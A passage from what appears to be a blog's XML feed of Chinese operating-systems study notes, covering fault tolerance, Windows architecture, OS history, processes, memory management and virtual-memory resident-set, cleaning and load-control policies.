style="height:2.1297em;vertical-align:-0.7693em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">MTTF</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">MTTR</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">MTTF</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p></li></ul></li></ul><h5 id="2-5-2错误">2.5.2错误</h5><ul><li>永久性错误：错误一旦发生，就会一直存在。错误在故障本部分替换或修复前一直存在，如硬盘磁头损坏、软件错误、通信部件损坏</li><li>临时性错误：错误不存在于所有操作条件下<ul><li>瞬时性错误：仅发生一次，如冲激噪声造成的位传输错误、电源故障、改变内存位的辐射</li><li>间歇性错误：发生在多个不可预测的时间，如连接松动</li></ul></li><li>空间（物理）冗余<ul><li>使用多个组件同时执行相同的功能，如多条并行线路以多数输出的结果作为输出</li><li>设置一个可用组件作为备份，以防另一组件出现错误的情况，如互联网上的备用域名服务器</li></ul></li><li>时间冗余<ul><li>检测到错误时重复某一功能或操作</li><li>对于临时性错误有效，对于永久性错误无效</li></ul></li><li>信息冗余：通过复制或编码数据的方式来检测和修复位数据，进而提高容错性。如存储系统所用的差错控制编码电路和RAID磁盘所用的纠错技术</li></ul><h5 id="2-5-3操作系统机制">2.5.3操作系统机制</h5><p>一些提高容错性的技术</p><ul><li>进程隔离<ul><li>进程在内存、文件存取和执行过程中通常是相互隔离的</li></ul></li><li>并发控制</li><li>虚拟机</li><li>检测点和回滚机制<ul><li>检测点是<strong>应用程序状态</strong>的一个<strong>副本</strong>，该副本在<strong>可考虑范围内</strong>保存于<strong>对错误免疫</strong>的<strong>存储介质</strong>中</li><li><strong>回滚</strong>从先前存储的<strong>检测点</strong>重新开始执行</li><li>可用于从<strong>瞬时错误</strong>及<strong>永久性硬件故障</strong>、某些类型的<strong>软件异常</strong>中恢复</li></ul></li></ul><h1>2.7微软Windows系统简介</h1><h5 id="2-7-1背景">2.7.1背景</h5><p>MS-DOS（Windows）=》Windows NT=》Windows8</p><h5 id="2-7-2体系结构">2.7.2体系结构</h5><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%EF%BC%88%E4%B8%8B%EF%BC%89/os1.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%EF%BC%88%E4%B8%8B%EF%BC%89/os2.14.jpg" class=""><ul><li><p>Windows的体系结构是<strong>高度模块化</strong>的</p></li><li><p>每个函数都正好由一个操作系统部件管理，操作系统的其余部分和所有应用程序通过相应的部件使用标准接口来访问这个函数</p></li><li><p>理论上，任何模块都可以移动、升级或替换，而不需要重写整个系统或其标准应用程序编程接口（API）</p><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%EF%BC%88%E4%B8%8B%EF%BC%89/os2.jpg" class=""><ul><li>硬件抽象层<ul><li>在通用的硬件命令和响应与某一特定平台专用的命令和响应之间进行映射，它将操作系统从与平台相关的硬件差异中隔离出来</li><li>HAL使得每个机器的系统总线、直接存储访问（DMA）控制器、中断控制器、系统计时器和存储控制器对内核来说看上去是相同的</li><li>支持SMP</li></ul></li></ul></li><li><p>执行体模块：</p><ul><li>I/O管理器：负责实现所有Windows I/O API，并实施安全性、设备命名和文件系统（使用对象管理器）</li><li>高速缓存管理器<ul><li>使最近访问过的磁盘数据驻留在<strong>内存</strong>中，以实现快速访问</li><li>在<strong>更新后的数据</strong>发送到<strong>磁盘</strong>前，于<strong>内存中</strong>保持一段<strong>很短的时间</strong>，<strong>延迟</strong>磁盘<strong>写</strong>操作，进而提高基于文件的I/O性能</li></ul></li><li>对象管理器<ul><li><strong>创建、管理和删除</strong>Windows<strong>执行体对象</strong>和用于表示诸如进程、线程和同步对象等资源的<strong>抽象数据类型</strong></li><li>为对象的保持、命名和安全性设置实施统一的规则</li><li>负责创建对象句柄（由<strong>访问控制信息</strong>和<strong>指向对象的指针</strong>组成）</li></ul></li><li>即插即用管理器：决定并加载特定设备的<strong>驱动</strong></li><li>电源管理器<ul><li>调整各种设备间的电源管理</li><li>可以把处理器设置为休眠状态==》节能</li><li>可以把内存中的内容写入磁盘，然后切断整个系统的电源</li></ul></li><li>安全访问监控程序：强制执行访问确认和审核产生规则</li><li>虚存管理器<ul><li>管理虚拟地址、物理地址和磁盘上的页面文件</li><li>控制内存管理硬件和相应的数据结构，把进程地址空间中的虚地址映射到计算机内存中的物理页</li></ul></li><li>进程/线程管理器</li><li>配置管理器：负责执行和管理<strong>系统注册表</strong>（保存系统和用户参数设置的数据仓库）</li><li>本地过程调用（<em>LPC，Local Procedure Call</em>）机制：类似于<strong>分布处理</strong>中的<strong>远程过程调用（<em>RPC，Remote Procedure Call</em>）</strong></li></ul></li><li><p>Windows支持4种基本的<strong>用户模式进程</strong></p><ul><li>特殊系统进程：管理系统所需的用户模式服务，如绘画管理程序、认证子系统、服务管理程序、登录进程</li><li>服务进程<ul><li>打印机后台管理程序、事件记录器、与设备驱动协作的用户模式构件、不同的网络服务程序</li><li>这些服务是在Windows系统中国后台运行用户模式活动的唯一办法</li></ul></li><li>环境子系统<ul><li>提供不同的操作系统个性化设置（环境）</li><li>支持的子系统由Win32和POSIX</li><li>每个环境子系统包括一个在所有子系统应用程序种会都共享的子系统进程，以及把用户应用程序调用转换为<strong>本地过程调用（LPC）<strong>和/或</strong>本地Windows调用的动态连接客（DLL）</strong></li></ul></li><li>用户应用程序<ul><li>为充分利用系统功能而为用户提供的<strong>可执行程序（EXE）<strong>和</strong>动态链接库（DLL）</strong></li><li>支持在64位系统上运行32位程序</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第二章-操作系统概述（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0(%E4%B8%8A%EF%BC%89/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0(%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1>2.1操作系统的目标和功能</h1><ul><li>操作系统是<strong>控制</strong>应用程序执行的<strong>程序</strong>，是应用<strong>程序</strong>和<strong>计算机硬件</strong>间的<strong>接口</strong></li></ul><h5 id="2-1-1作为用户-计算机接口的操作系统">2.1.1作为用户/计算机接口的操作系统</h5><ul><li>须提供一些系统程序以便于开发应用程序，其中一部分称为<strong>实用工具</strong>或<strong>库</strong>，它们实现了<strong>创建程序、管理文件</strong>和<strong>控制I/O设备</strong>时常用的功能</li><li>最重要的系统程序是操作系统</li><li>操作系统通常提供的服务：<ul><li>程序开发</li><li>程序运行：一个程序运行时，要把<strong>指令</strong>和<strong>数据</strong>加载到<strong>内存</strong>、<strong>初始化</strong>I/O设备和文件、准备其他一些资源，操作系统为用户处理这些<strong>调度</strong>问题</li><li>I/O设备访问</li><li>文件访问控制</li><li>系统访问：提供资源和数据的保护、解决资源竞争时的冲突问题</li><li>错误检测和响应：<ul><li>对于每种错误，操作系统必须提供响应以清除错误条件，使其对正在运行的应用的影响最小</li><li>响应：终止引起错误的程序、重试操作、简单地给应用程序报告错误</li><li>记账：收集对各种资源地利用率地统计数据，监控诸如响应时间之类地性能参数</li></ul></li></ul></li><li>典型计算机系统中地三种重要接口：<ul><li>指令系统体系结构（ISA）<ul><li>定义了<strong>机器语言指令系统</strong></li><li><strong>硬件与软件</strong>的分界线</li><li><strong>应用程序</strong>和<strong>实用程序</strong>都可以直接访问ISA，这些程序使用指令系统的一个子集（用户集ISA），<strong>操作系统</strong>使用操作<strong>系统资源</strong>的机器语言指令（系统级ISA)</li></ul></li><li>应用程序二进制接口（ABI）<ul><li>定义了<strong>程序</strong>间<strong>二进制可移植性</strong>的标准、<strong>操作系统</strong>的<strong>系统调用接口</strong>、在系统中通过ISA能使用的<strong>硬件资源服务</strong></li></ul></li><li>应用程序编程接口（API）<ul><li>允许<strong>应用程序</strong>访问系统的<strong>硬件资源</strong>和<strong>服务</strong>，这些服务由<strong>用户级ISA</strong>和<strong>高级语言库（HLL）调用</strong>来提供</li><li>让<strong>应用软件</strong>更容易<strong>重新编译</strong>并<strong>移植</strong>到具有<strong>相同API</strong>的<strong>其他系统</strong>中</li></ul></li></ul></li></ul><h5 id="2-1-2作为资源管理的操作系统">2.1.2作为资源管理的操作系统</h5><ul><li><p>操作系统与普通计算机软件的作用相同，即它是由<strong>处理器</strong>执行的<strong>一段程序或一组程序</strong>，区别在于程序的意图</p></li><li><p>操作系统经常会<strong>释放控制</strong>，而且必须依赖<strong>处理器</strong>才能<strong>恢复控制</strong></p></li><li><p><strong>操作系统</strong>控制<strong>处理器</strong>使用其他<strong>资源</strong>，并<strong>控制</strong>其他程序<strong>执行的时机</strong></p></li><li><p>处理器要去执行其他程序，就必须<strong>停止</strong>执行<strong>操作系统程序</strong>。这时操作系统会<strong>释放</strong>对处理器的<strong>控制</strong>，处理后用足够长的时间<strong>恢复控制权</strong>，让处理器准备好下一件工作</p></li><li><p>操作系统的一部分在内存中，包括**内核程序（<em>kernel或nucleus</em>）**和当前正在使用的其他操作系统程序</p></li><li><p><strong>内核程序</strong>包含<strong>操作系统</strong>中<strong>最常使用</strong>的功能</p></li><li><p>内存的其余部分包含<strong>用户程序</strong>和<strong>数据</strong>，它的分配由<strong>操作系统</strong>和<strong>处理器</strong>中的<strong>存储管理硬件</strong>联合控制完成</p></li><li><p>操作系统在运行一个特定的用户程序时，决定分配给处理器的时间，且在多处理器系统中，这一决定传达到所有处理器</p></li></ul><h1>2.2操作系统的发展史</h1><h5 id="2-2-1串行处理">2.2.1串行处理</h5><ul><li>问题：调度、准备时间</li></ul><h5 id="2-2-2简单批处理系统">2.2.2简单批处理系统</h5><ul><li><p>中心思想：使用称为<strong>监控程序（<em>monitor</em>）</strong></p></li><li><p>作业= =》（按顺序组织）= =》批= =》输入设备= =》（监控程序使用）</p></li><li><p>每个程序完成处理后返回监控程序，同时监控程序自动加载下一个程序</p></li><li><p>监控程序角度：</p><ul><li><p><strong>监控程序</strong>控制事件的<strong>顺序</strong></p></li><li><p>大部分监控程序必须总是处于内存中并且可以执行，这部分程序称为<strong>常驻监控程序（<em>resident monitor</em>）</strong>，其他部分包括一些<strong>实用程序</strong>和<strong>公用函数</strong>作为用户程序的子程序，在需要用到它们的作业<strong>开始执行</strong>时才被载入</p></li><li><p>1、监控程序每次从输入设备（通常是卡片阅读机或磁带驱动器）中读取一个作业</p><p>2、当前作业被放置在用户程序区域</p><p>​   控制权交给这个作业</p><p>3、作业完成后，控制权返回给监控程序，监控程序立即读取下一个作业</p><p>4、每个作业的结果发送到输出设备</p></li></ul></li><li><p>处理器角度：</p><ul><li><p>处理器执行<strong>内存</strong>中存储的<strong>监控程序</strong>中的<strong>指令</strong>，这些指令<strong>读入下一个作业</strong>并<strong>存储到内存中的另一部分</strong></p></li><li><p>1、处理器执行指令，读入一个作业</p><p>2、处理器遇到<strong>监控程序</strong>中的<strong>分支指令</strong>，分支指令指导处理器在<strong>用户程序的开始处</strong>继续执行</p><p>3、处理器继而执行用户程序中的指令，指导遇到一个<strong>结束指令</strong>或<strong>错误条件</strong></p><p>4、处理器从监控程序中去下一条指令</p></li><li><p>“控制权交给作业”：处理器当前取的和执行的都是用户程序中的指令</p><p>“控制权返回给监控程序”：处理器当前从监控程序中去指令并执行指令</p></li></ul></li><li><p>监控程序<strong>完成调度功能</strong>：一批作业排队等候，处理器尽可能迅速地执行作业，没有任何空闲事件</p></li><li><p>监控程序改善了作业的准备时间</p></li><li><p>监控处理程序或批处理操作系统，只是一个简单的计算机程序，它依赖于处理器可从内存的不同部分取指令的能力，交替地获取或释放控制权，并且考虑了硬件功能：</p><ul><li><p>内存保护：</p><p>当用户程序正在运行时，不能改变包括监控程序的内存区域</p><p>or：处理器硬件发生错误→控制权转移给监控程序→取消作业，输出错误信息→加载下一个作业</p></li><li><p>定时器：防止一个作业独占系统，在每个作业开始时设置</p></li><li><p>特权指令：</p><p>某些<strong>机器指令</strong>被设计成<strong>特权指令</strong>，只能由<strong>监控程序</strong>执行，处理器在运行一个用户程序时遇到这类指令会发生错误，并将<strong>控制权</strong>转移给监控程序</p><p>I/O指令属于特权指令，监控程序可以控制所有的I/O设备，还可以避免程序意外地读到下一个作业中地作业控制指令</p></li><li><p>中断</p></li></ul></li><li><p>用户程序以**用户模式（<em>user mode</em>）<strong>执行，监控程序以系统态或</strong>内核模式（<em>kernel mode</em>）**执行</p></li><li><p>用户程序和监控程序交替执行</p></li><li><p>缺点：系统开销</p><ul><li>一部分内存交付给监控程序</li><li>监控程序消耗了一部分机器时间</li></ul></li></ul><h5 id="2-2-3多道批处理系统">2.2.3多道批处理系统</h5><ul><li><p>单道程序设计（<em>uniprogramming</em>）</p><p>处理器花费一定的运行时间进行计算，直到遇到一个I/O指令，这时它必须等到I/O指令结束后才能继续进行</p></li><li><p>多道程序设计（<em>multiprogramming</em>）或多任务处理（<em>multitasking</em>）</p><p>内存空间可以保存操作系统（常驻监控程序）和多个用户程序，执行时进行切换</p></li></ul><ul><li>对多道程序设计最有帮助地硬件是，支持<strong>I/O中断</strong>和**直接存储器访问（<em>Direct Memory Access，DMA</em>）**的硬件</li><li>多道程序设计操作系统比单个程序或<strong>单道程序设计（<em>uniprogramming</em>）<strong>系统复杂，待运行的多个作业必须保留在内存中，因此需要</strong>内存管理（<em>memory management</em>）</strong></li><li>使用多道程序设计，可使**批处理（<em>batch processing</em>)**更加有效</li></ul><h5 id="2-2-4分时系统">2.2.4分时系统</h5><ul><li><p>多道程序设计允许处理器同时处理多个批作业，还可以处理多个交互作业。对于后者而言，由于多个用户分享处理器时间，因而该技术称为<strong>分时（<em>time sharing</em>）</strong></p></li><li><p><strong>多个用户</strong>可以通过<strong>终端</strong><u>同时</u>访问<strong>系统</strong>，由<strong>操作系统</strong>控制每个<strong>用户程序</strong>在<strong>很短时间</strong>内<strong>交替执行</strong></p></li><li><p>如果有n个用户同时请求服务，若不计操作系统开销，每个用户平均只能得到计算机有效速度的1/n</p></li><li><p>设计良好的系统相应时间可以接近于专用计算机的响应时间</p></li><li><table><thead><tr><th></th><th>批处理多道程序</th><th>分时</th></tr></thead><tbody><tr><td>主要目标</td><td>充分利用处理器</td><td>减小响应时间</td></tr><tr><td>操作系统指令源</td><td>作业控制语言<br />作业提供的命令</td><td>终端键入的命令</td></tr></tbody></table></li><li><p>时间片（<em>time sharing</em>）技术：在固定时间间隔内，当前用户被抢占，另一个用户被载入</p></li></ul><h1>2.3主要成就</h1><h5 id="2-3-1进程">2.3.1进程</h5><ul><li><p>进程的概念是操作系统设计的核心</p></li><li><p>定义：</p><ul><li>一个正在执行的程序</li><li>计算机中正在运行的程序的一个实例</li><li>可分配给处理器并由处理器执行的一个实体</li><li>由一个单一顺序线程、一个当前状态和一组相关的系统资源所表征的活动单元</li></ul></li><li><p>计算机系统发展的三条主线</p><ul><li>多道程序批处理操作<ul><li>为了让处理器和I/O设备（包括存储设备）同时保持忙状态，以实现最大效率</li><li>关键机制：在响应表示I/O事务结束的信号时，操作系统将对内存中驻留的不同进程进行处理器切换</li></ul></li><li>分时系统<ul><li>为了能及时响应单个用户的要求</li></ul></li><li>实时事务处理系统<ul><li>应对场景举例：很多用户都在对数据库进行查询或修改（航空公司订票）</li><li>事务处理系统和分时系统的差别：前者局限于一个或几个应用，而后者的用户可以开始程序、执行作业以及使用各种各样的应用程序</li></ul></li></ul></li><li><p>程序设计中少见的错误</p><ul><li>不确定的同步：常常会出现一个例程必须挂起，等待系统中其他地方的某一事件的情况</li><li>失败的互斥：常常会出现多个用户或程序试图同时使用一个共享资源的情况（如同时编辑一个文件）</li><li>不确定的程序操作：<ul><li>某个特定程序的结果只依赖于该程序的输入，而不依赖于共享系统中其他程序的活动</li><li>当程序共享内存且处理器控制它们交替执行时，它们可能会因为重写相同的内存区域而发生不可预测的相护干扰</li></ul></li><li>死锁：<ul><li>很可能两个或多个程序相互挂起等待</li><li>如两个程序可能都需要两个I/O设备执行一些操作（如从磁盘复制到磁带）。一个程序获得了一个设备的控制权，而另一个程序获得了另一个设备的控制权，它们都等待对方释放自己想要的资源</li><li>这样的死锁依赖于资源分配和释放的时机安排</li></ul></li></ul></li><li><p>进程的组成</p><ul><li>一段可执行的程序</li><li>程序所需要的相关数据（变量、工作时间、缓冲区等）</li><li>程序的执行上下文（根本）<ul><li><strong>执行上下文（<em>execution context</em>）<strong>又称为</strong>进程状态（<em>process state</em>）</strong>，是<strong>操作系统</strong>用来<strong>管理和控制进程</strong>所需要的<strong>内部数据</strong></li><li>这种内部信息和进程是<strong>分开</strong>的，因为操作系统不允许进程直接访问</li><li>上下文包括操作系统管理<strong>进程</strong>及<strong>处理器</strong>正确<strong>执行</strong>进程所需的<strong>所有信息</strong>，包括各种处理器寄存器的内容，如程序计数器和数据寄存器</li><li>上下文还包括<strong>操作系统</strong>使用的信息，如<strong>进程优先级</strong>和<strong>进程是否在等待特定I/O事件的完成</strong></li></ul></li></ul><p>一种进程管理的办法：</p><ul><li><p>每个进程分配得到了一块存储器区域，并且在<strong>操作系统建</strong>立和维护的<strong>进程表</strong>中进行了<strong>记录</strong></p></li><li><p>进程表包含记录每个进程的<strong>表项</strong>，表项内容包括指向包含<strong>进程的存储地址</strong>的<strong>指针</strong>，还包括该进程的<strong>部分或全部执行上下文</strong></p></li><li><p>执行上下文的其余部分存放在别处，可能和进程本身保存在一起，通常还可能保存在内存中的一块独立的区域</p></li><li><p><strong>进程索引寄存器（<em>process index register</em>）<strong>包含当前</strong>正在控制处理器</strong>的<strong>进程</strong>在<strong>进程表</strong>中的<strong>索引</strong></p></li><li><p><strong>程序计数器（<em>program counter</em>）<strong>指向该进程的</strong>下一条</strong>待执行的<strong>指令</strong></p></li><li><p><strong>基址寄存器（<em>base register</em>）<strong>和</strong>界限寄存器（<em>limit register</em>）<strong>定义该进程所占据的</strong>存储器区域</strong></p><p>基址寄存器：保存该存储器区域的<strong>开始地址</strong></p><p>界限寄存器：保存该区域的<strong>大小</strong>（以字节或字为单位）</p></li><li><p>程序计数器和所有数据引用<strong>相对于基址寄存器来解释</strong>，且不能超过<strong>界限寄存器中的值</strong>，因此可以保护<strong>内部进程不会相互干涉</strong></p></li><li><p>图中进程索引寄存器表名进程B正在执行，以前执行的进程被临时中断，在A中断的同时，所有寄存器的内容被记录在其执行上下文环境中，以后操作系统就可以执行进程切换，恢复进程A的执行</p></li><li><p>线程（<em>thread</em>）：一个<strong>分配了资源的进程</strong>可分解为多个<strong>并发</strong>的<strong>线程</strong>，这些线程相互协作执行，完成进程的工作</p></li></ul></li></ul><h5 id="2-3-2内存管理">2.3.2内存管理</h5><ul><li><p>操作系统担负着5项存储器管理职责：</p><ul><li>进程隔离<ul><li>操作系统必须保护独立的进程，防止相互干扰各自的存储空间，包括数据和指令</li></ul></li><li>自动分配和管理<ul><li>程序应该根据需要在存储层次间动态地分配，分配对程序员透明</li></ul></li><li>支持模块化程序设计</li><li>保护和访问控制</li><li>长期存储</li></ul></li><li><p>（典型）操作系统使用<strong>虚存</strong>和<strong>文件系统机制</strong>来履行这些职责</p></li><li><p>对操作系统来说，<strong>文件</strong>是<strong>访问控制</strong>和<strong>保护</strong>的一个有用单元</p></li><li><p><strong>虚存机制</strong>允许程序以<strong>逻辑</strong>方式访问<strong>存储器</strong>，而不考虑<strong>物理内存</strong>上可用的<strong>空间数量</strong></p><ul><li>满足<u>多个用户作业同时驻留在内存中的要求</u>，一个进程被写出到辅助存储器中且后续进程被读入时，连续的进程执行之间不会脱节</li></ul></li><li><p><u>进程大小不同时</u>，若处理器在很多进程间切换，则很难将它们紧密的压入内存==》引入<strong>分页系统</strong></p><ul><li><p>进程由许多<strong>固定大小</strong>的<strong>块</strong>组成，这些块被称为<strong>页</strong></p></li><li><p>程序通过<strong>虚地址（<em>virtual address</em>）<strong>访问</strong>字</strong>，虚地址=页号+页中的偏移量</p></li><li><p><strong>分页系统</strong>提供了进程中使用的<strong>虚地址</strong>和内存中的<strong>实地址（<em>real address</em>）<strong>或物理地址之间的</strong>动态映射</strong></p></li><li><p>虚存（<em>virtual memory</em>）</p><ul><li><p>一个进程的所有页都保存在<strong>磁盘</strong>中，进程执行时，一部分页会调入<strong>内存</strong>中</p></li><li><p>若要访问的某页不在内存中，<strong>存储管理硬件</strong>会在检测到它后，安排<strong>载入</strong>这个<strong>缺页（<em>missing page</em>）</strong></p></li></ul></li></ul></li><li><p>虚拟处理器</p><ul><li><p>处理器硬件和操作系统共同提供”虚拟处理器“的概念，有对<strong>虚存的访问权</strong></p></li><li><p>给每个进程<strong>唯一</strong>的<strong>不重叠</strong>的虚存空间==》实现<strong>进程隔离</strong></p><p>两个虚存空间<strong>一部分重叠</strong>==》内存<strong>共享</strong></p></li><li><p>文件或其一部分可以复制到虚存中提供程序操作</p><ul><li>存储器由内存和低速辅助存储器组成，内存可以<strong>直接</strong>访问（通过机器指令），外存可以通过把<strong>块</strong>载入内存<strong>间接</strong>访问</li><li>如果访问的虚地址不在实际内存中，实际内存中的一部分内容将换到外存中，然后换入所需要的数据块</li></ul></li></ul></li></ul><h5 id="2-3-3信息保护和安全">2.3.3信息保护和安全</h5><p>与操作系统相关的大多数安全和保护问题可以分为4类</p><ul><li>可用性：保护系统不被中断</li><li>保密性：保证用户不能读取未授权访问的数据</li><li>数据完整性：保护数据不被未授权修改</li><li>认证：涉及用户身份的正确认证和消息或数据的合法性</li></ul><h5 id="2-3-4调度和资源管理">2.3.4调度和资源管理</h5>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第八章-虚拟内存（三）</title>
    <link href="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%983/"/>
    <url>/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%983/</url>
    
    <content type="html"><![CDATA[<h3 id="8-2-4-驻留集管理">8.2.4 驻留集管理</h3><ul><li><p>驻留集大小</p><ul><li>考虑因素<ul><li>分配给一个进程的内存越少，驻留在内存中的进程数↑，操作系统至少找到一个就绪进程的可能性↑，由于交换而消耗的处理器时间↓</li><li>若一个进程在内存中的页数较少，尽管有局部性原理，缺页率仍相对较高</li><li>给特定进程分配的内存空间<u>超过一定大小</u>后，由于局部性原理，该进程的缺页率没有明显的变化</li></ul></li></ul></li><li><p><strong>固定分配策略（fixed-allocation）</strong></p><ul><li>为一个进程在内存中分配<strong>固定数量的页框</strong>，以供执行时使用</li><li>一旦在进程的执行过程中发生缺页中断，该进程的一页就必须被它所需要的页面置换</li></ul></li><li><p><strong>可变分配策略（variable-allocation)</strong></p><ul><li>允许分配给一个进程的<strong>页框</strong>在该进程的<u>生命周期</u>中<u>不断地发生变化</u></li><li>若一个进程的<strong>缺页率一直比较高</strong>，则表明在该进程中<strong>局部性原理表现较弱</strong>，应给它<strong>多分配</strong>一些页框以减小缺页率</li><li>而若一个进程的缺页率特别低，则表明从局部性的角度看该进程的表现非常好，可在不明显增大缺页率的前提下减少分配给它的页框</li><li>难点<ul><li>要求操作系统评估活动进程的行为==&gt;增加操作系统的软件开销</li><li>取决于处理器平台所提供的硬件机制</li></ul></li></ul></li><li><p>置换范围</p><ul><li><strong>局部置换策略（local replacement policy）</strong><ul><li>仅在产生这次缺页的进程的驻留页中选择</li><li>更易于分析</li></ul></li><li><strong>全局置换策略（global replacement policv）</strong><ul><li>把内存中<u>所有</u>未被锁定的页都作为置换的候选页，而<u>不管它们属于哪个进程</u></li><li>实现简单、开销较小</li></ul></li></ul></li><li><p>驻留集管理</p><table><thead><tr><th></th><th>局部置换</th><th>全局置换</th></tr></thead><tbody><tr><td>固定分配</td><td>分配给一个进程的页框数是固定的<br />从分配给该进程的页框中选择被置换的页</td><td>无此方案</td></tr><tr><td>可变分配</td><td>分配给一个进程的页框数不时变化，用于保存该进程的工作集<br />从分配给该进程的页框中选择被置换的页<br /></td><td>内存中的所有可用页框中选择被置换的页；这将导致进程驻留集的大小不断变化</td></tr></tbody></table><ul><li><p>固定分配、局部范围</p><p>缺点：</p><p>1、总页数分配得过少时，会产生很高的缺页率，导致整个多道程序设计系统运行缓慢</p><p>2、分配得过多时，内存中只能有很少的几个程序，处理器会有很多空闲时间，并把大量的时间花费在交换上</p></li><li><p>可变分配、全局范围</p><ul><li>被许多操作系统采用</li><li>操作系统维护有一个空闲页框列表<ul><li>发生一次缺页中断时，一个空闲页框会被添加到进程的驻留集，并读入该页</li><li>发生缺页中断的进程的大小会逐渐增大，这将<u>有助于减少系统中的缺页中断总量</u></li></ul></li><li>难点在于置换页的选择<ul><li>驻留集大小减小的那个进程可能并不是最适合被置换的</li><li>使用页缓冲解决</li></ul></li></ul></li><li><p>可变分配、局部范围</p><p>1、当一个新进程被装入内存时，根据应用类型、程序要求或其他原则，给它分配一定数量的 页框作为其驻留集。使用预先分页或请求分页填满这些页框</p><p>2、发生一次缺页中断时，从产生缺页中断的进程的驻留集中选择一页用于置换</p><p>3、不时地重新评估进程的页框分配情况，增加或减少分配给它的页框，以提高整体性能</p></li></ul></li></ul><h3 id="8-2-5-清除策略">8.2.5 清除策略</h3><p>清除策略用于确定<strong>何时</strong>将已修改的一页<strong>写回辅存</strong>（读取策略决定某页何时取入内存）</p><ul><li><p>请求式清除（demand cleaning）</p><ul><li><p>只有当一页<strong>被选择用于置换</strong>时才被写回辅存</p></li><li><p>problem：写回辅存的一页可能仍然留在内存中， 直到页面置换算法指示它被移出</p><p>写回已修改的一页和读入新页是成对出现的，且写回在读入之前。 这种技术可以减少写页，但它意味着发生缺页中断的进程在解除阳寒之前必须等待两次页传送，而这可能会降低处理器的利用率</p></li></ul></li><li><p>约式清除（precleaning）</p><ul><li>将这些<strong>已修改的多页</strong>在需要使用它们所占据的页框之前<strong>成批写回辅存</strong></li><li>problem：允许成批地写回页，但这并无太大的意义，因为这些页中的大部分通常会在置换前又被修改</li></ul></li><li><p>一种较好的方法是结合页缓冲技术</p><ul><li>只清除可用于置换的页， 但去除了清除和置换操作间的成对关系</li><li>通过页缓冲，被置换页可放置在两个表中∶修改表和未修改表</li><li>修改表中的页可以周期性地成批写出，并移到未修改表中</li><li>未修改表中的一页要么因为被访问到而被回收，要么在其页框分配给另一页时被淘汰</li></ul></li></ul><h3 id="8-2-6-加载控制">8.2.6 加载控制</h3><ul><li><p>加载控制会影响到<strong>驻留在内存中的进程数量</strong>，这称为<strong>系统并发度</strong></p></li><li><p>如果某一时刻驻留的进程太少，那么所有进程<strong>都处于阻塞态</strong>的概率就较大， 因而会有许多时间花费在<strong>交换</strong>上</p></li><li><p>如果驻留的进程太多，平均每个进程的驻留集大小将会不够用，此时会<strong>频繁发生缺页中断</strong>，从而导 致<strong>系统抖动</strong></p></li><li><p>系统并发度（Multiprogramming level）</p><img src="/2024/02/20/%E7%AC%AC%E5%85%AB%E7%AB%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%983/os8.19.jpg" class=""><ul><li>当系统并发度从一个较小的值开始增加时，由于很少会出现<strong>所有驻留进程都被阻塞</strong>的情况，因此<strong>处理器</strong>的<strong>利用率增长</strong></li><li>在到达某一点时，<strong>平均驻留集</strong>会不够用，此时缺页中断数量迅速增加，从而处理器的<strong>利用率下降</strong></li></ul></li><li><p>进程挂起</p><ul><li><strong>系统并发度减小</strong>时，一个或多个当前驻留进程须被挂起</li><li>可能情况<ul><li>最低优先级进程<ul><li>实现调度策略决策，与性能问题无关</li></ul></li><li>缺页中断进程<ul><li>原因在于很有可能是缺页中断任务的工作集还未驻留，因而挂起它对性能的影响最小</li><li>由于它阻塞了一个<strong>一定会被阻塞</strong>的进程，并且<strong>消除</strong>了<strong>页面置换和I/O操作</strong>的开销，因而该选择可以立即收到成效</li></ul></li><li>最后一个被激活的进程<ul><li>这个进程的工作集<strong>最有可能还未驻留</strong></li></ul></li><li>驻留集最小的进程<ul><li>在将来再次装入时的<strong>代价最小</strong>，但<u>不利于</u><strong>局部性较小</strong>的程序</li></ul></li><li>最大空间的进程<ul><li>可在过量使用的内存中得到<strong>最多的空闲页框</strong>，使它不会很快又处于<strong>去活 （deactivation）状态</strong></li></ul></li><li>具有最大剩余执行窗口的进程<ul><li>在大多数进程调度方案中，一个进程在被中断或放置在就绪队列末尾之前，只运行一定的时间</li><li>近似于<strong>最短处理时间优先</strong>的调度原则</li></ul></li></ul></li></ul></li></ul>]]></content>
    
    
